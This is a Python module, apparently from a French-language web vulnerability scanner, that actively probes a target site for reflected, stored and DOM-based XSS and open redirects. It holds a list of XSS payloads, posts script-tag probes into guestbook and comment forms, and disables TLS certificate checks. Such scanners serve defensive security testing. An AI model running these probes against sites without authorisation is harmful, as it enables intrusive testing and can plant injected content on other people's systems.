import urllib.request
import urllib.parse
import urllib.error
import ssl

SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=\"alert(1)\">",
    "\"><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<input autofocus onfocus=alert(1)>",
]

VULN_PATHS = [
    ("/search.php",    ["test"]),
    ("/guestbook.php", ["name", "comment"]),
    ("/userinfo.php",  ["uname"]),
    ("/hpp/",          ["pp"]),
    ("/search",        ["q", "query", "s", "keyword"]),
    ("/",              ["q", "search", "s"]),
    ("/contact",       ["name", "message", "email"]),
    ("/feedback",      ["name", "msg", "comment"]),
    ("/login",         ["username", "user"]),
]

DOM_XSS_SINKS    = ["document.write(", ".innerHTML", "eval(", "setTimeout(", "location.href", "document.cookie"]
DOM_XSS_SOURCES  = ["location.search", "location.hash", "document.referrer", "window.name"]


def _fetch(url, timeout=8):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        resp = urllib.request.urlopen(req, context=SSL_CTX, timeout=timeout)
        return resp.read(100000).decode(errors="ignore"), resp.status
    except urllib.error.HTTPError as e:
        return e.read(10000).decode(errors="ignore"), e.code
    except Exception:
        return "", 0


def _fetch_post(url, data, timeout=8):
    try:
        payload = urllib.parse.urlencode(data).encode()
        req = urllib.request.Request(url, data=payload, headers={
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/x-www-form-urlencoded"
        })
        resp = urllib.request.urlopen(req, context=SSL_CTX, timeout=timeout)
        return resp.read(100000).decode(errors="ignore"), resp.status
    except urllib.error.HTTPError as e:
        return e.read(10000).decode(errors="ignore"), e.code
    except Exception:
        return "", 0


class XSSDetector:
    def __init__(self, logger):
        self.logger = logger

    def _is_reflected(self, payload, body):
        if payload in body:
            return True
        if "<script>" in payload and "<script>" in body.lower():
            return True
        if "onerror=" in payload and "onerror=" in body.lower():
            return True
        if "onload=" in payload and "onload=" in body.lower():
            return True
        return False

    def _test_get(self, base_url, param):
        for payload in XSS_PAYLOADS:
            url = f"{base_url}?{param}={urllib.parse.quote(payload, safe='')}"
            body, status = _fetch(url)
            if body and self._is_reflected(payload, body):
                return {
                    "severity": "HIGH",
                    "title": f"XSS Réfléchi (GET): {urllib.parse.urlparse(base_url).path}?{param}",
                    "detail": f"Payload: {payload[:80]} | URL: {url[:120]}"
                }
        return None

    def _test_post(self, base_url, params):
        for payload in XSS_PAYLOADS[:6]:
            for param in params:
                data = {p: "test" for p in params}
                data[param] = payload
                body, status = _fetch_post(base_url, data)
                if body and self._is_reflected(payload, body):
                    return {
                        "severity": "HIGH",
                        "title": f"XSS Réfléchi (POST): {urllib.parse.urlparse(base_url).path} [{param}]",
                        "detail": f"Payload via POST: {payload[:80]}"
                    }
        return None

    def _check_dom_xss(self, base, paths):
        findings = []
        for path_entry in paths[:8]:
            path = path_entry[0] if isinstance(path_entry, tuple) else path_entry
            body, status = _fetch(base + path)
            if not body:
                continue
            sinks   = [s for s in DOM_XSS_SINKS   if s in body]
            sources = [s for s in DOM_XSS_SOURCES  if s in body]
            if sinks and sources:
                findings.append({
                    "severity": "HIGH",
                    "title": f"DOM XSS probable: {path}",
                    "detail": f"Sources: {sources} → Sinks: {sinks}"
                })
                self.logger.vuln("HIGH", f"DOM XSS: {path}", f"{sources} → {sinks}")
            elif sinks:
                findings.append({
                    "severity": "MEDIUM",
                    "title": f"DOM XSS sink dangereux: {path}",
                    "detail": f"Fonctions à risque: {sinks[:3]}"
                })
        return findings

    def _check_stored_xss(self, base):
        findings = []
        stored_paths = [
            ("/guestbook.php", {"name": "<script>alert(1)</script>", "comment": "test", "submit": "submit"}),
            ("/comment",       {"name": "<script>alert(1)</script>", "body": "test"}),
            ("/feedback",      {"name": "<script>alert(1)</script>", "message": "test"}),
        ]
        for path, data in stored_paths:
            body, status = _fetch_post(base + path, data)
            if status in (200, 302) and self._is_reflected("<script>alert(1)</script>", body):
                findings.append({
                    "severity": "CRITICAL",
                    "title": f"XSS Stocké: {path}",
                    "detail": "Payload injecté et renvoyé dans la réponse"
                })
                self.logger.vuln("CRITICAL", f"XSS Stocké: {path}")
        return findings

    def run(self, host, scheme="http", port=80, paths=None):
        self.logger.section("Cross-Site Scripting (XSS) Detection")
        findings = []

        base = f"{scheme}://{host}" if port in (80, 443) else f"{scheme}://{host}:{port}"
        paths_to_test = paths if paths else VULN_PATHS

        for path_entry in paths_to_test:
            path   = path_entry[0] if isinstance(path_entry, tuple) else path_entry
            params = path_entry[1] if isinstance(path_entry, tuple) else ["q", "search", "id"]

            url = base + path
            body, status = _fetch(url)
            if status == 0:
                continue

            for param in params:
                result = self._test_get(url, param)
                if result:
                    findings.append(result)
                    self.logger.vuln(result["severity"], result["title"], result["detail"][:100])
                    break

            result = self._test_post(url, params)
            if result:
                findings.append(result)
                self.logger.vuln(result["severity"], result["title"])

            if len(findings) >= 8:
                break

        findings.extend(self._check_dom_xss(base, paths_to_test))
        findings.extend(self._check_stored_xss(base))

        # Open Redirect
        for param in ["redirect", "url", "next", "return", "dest"]:
            body, _ = _fetch(f"{base}/login?{param}={urllib.parse.quote('https://evil.com')}")
            if body and "evil.com" in body:
                findings.append({
                    "severity": "MEDIUM",
                    "title": f"Open Redirect: {param}",
                    "detail": f"URL externe reflétée sur /login?{param}="
                })

        if not findings:
            self.logger.success("Aucun XSS détecté")
        else:
            self.logger.success(f"{len(findings)} XSS trouvé(s)")

        return findings
